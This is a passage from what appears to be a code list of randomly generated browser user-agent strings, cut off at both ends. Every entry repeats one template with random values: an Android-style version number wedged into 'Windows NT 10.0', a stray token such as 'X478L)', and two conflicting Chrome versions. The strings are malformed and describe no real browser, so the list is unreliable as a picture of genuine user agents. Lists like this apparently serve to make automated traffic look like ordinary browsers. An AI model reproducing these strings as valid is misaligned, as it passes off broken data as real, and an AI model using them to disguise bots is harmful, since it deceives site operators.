Gecko)94.0.4811.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O726U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4429.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N487P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4894.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C943K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4443.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E142Z) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4883.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)X478L) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4507.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B409X) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4554.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q315I) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4690.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J703P) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4406.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y789R) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4287.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I936B) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4768.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A273Z) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4897.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B602A) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4536.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)H512T) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4261.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D808A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4601.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W850E) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4271.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K43A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4874.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z608T) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4339.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R280V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4618.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T385O) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4589.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A724K) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4836.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U478V) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4392.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N3E) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4453.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N100B) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4342.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z431S) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4699.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I220Z) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4487.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q241J) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4510.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K394P) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4575.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E548C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4378.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D124E) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4800.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H362I) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4497.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G289R) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4827.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S156X) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4463.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z843C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4591.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)W759G) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4479.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F586M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4279.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P587E) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4251.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N842D) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4374.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W916I) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4227.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K898M) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4416.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V262P) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4812.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O143O) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4720.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V615P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4850.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W39G) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4786.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J13K) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4248.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A717A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4468.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C399D) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4559.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q636S) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4210.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V396V) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4446.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z128A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4800.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J152O) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4759.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V725N) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4845.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F411U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4418.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y815R) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4434.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L862T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4608.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B665O) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4898.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F802P) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4588.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S518R) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4859.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H786F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4891.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X626D) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4540.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y197F) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4790.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O289M) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4598.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H777J) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4333.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z637O) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4207.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C675A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4222.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T896X) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4842.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A135U) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4295.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q998S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4858.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N770C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4417.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C897C) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4414.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K19T) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4728.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C301M) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4551.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N894G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4744.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F963D) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4402.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T139D) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4254.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T525F) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4389.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z689E) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4475.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S460F) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4301.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y866V) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4566.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N466O) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4335.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N724N) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4458.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C66M) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4427.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S783T) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4670.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X32A) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4514.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K722I) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4706.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y869Q) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4394.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H211F) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4740.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A877Y) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4871.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q662A) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4603.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E98G) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4554.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A719X) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4359.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y492E) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4504.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A528J) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4790.72 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D717A) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4646.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K975U) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4416.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K192H) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4797.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N525D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4737.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F184D) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4479.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X708B) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4645.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)U383J) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4609.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E810B) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4761.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K806B) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4778.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T890K) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4878.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G689Q) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4753.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A141L) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4827.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P571J) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4472.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N238M) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4655.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E271M) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4598.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O882L) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4475.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U924W) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4781.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H667S) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4686.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G648D) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4835.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D626D) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4509.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E266W) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4656.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R377T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4284.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L437P) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4579.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U388V) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4641.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)G282N) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4458.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P527G) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4726.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J10C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4650.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K602D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4251.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H445A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4404.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S611R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4838.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H893D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4755.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W714L) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4829.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)R96T) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4271.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T556P) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4867.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M701L) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4208.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S611H) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4452.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O509U) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4562.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q642X) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4444.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H348L) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4625.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F23A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4590.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D937L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4661.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A769J) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4458.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q421Q) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4472.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O703Q) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4853.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T359L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4864.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B694F) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4732.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N314W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4847.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Z450S) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4581.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q871W) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4239.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B587O) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4610.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K164H) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4457.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C360M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4504.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P819B) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4795.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B853X) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4472.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F537Q) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4651.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B906A) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4534.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N138X) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4790.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B861U) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4498.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N398M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4326.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W337G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4330.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H489G) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4852.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Z347O) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4746.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z656S) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4846.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P420A) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4782.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A827U) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4657.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V20T) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4459.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I265P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4709.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S496D) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4491.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F912T) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4481.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I876O) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4517.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; 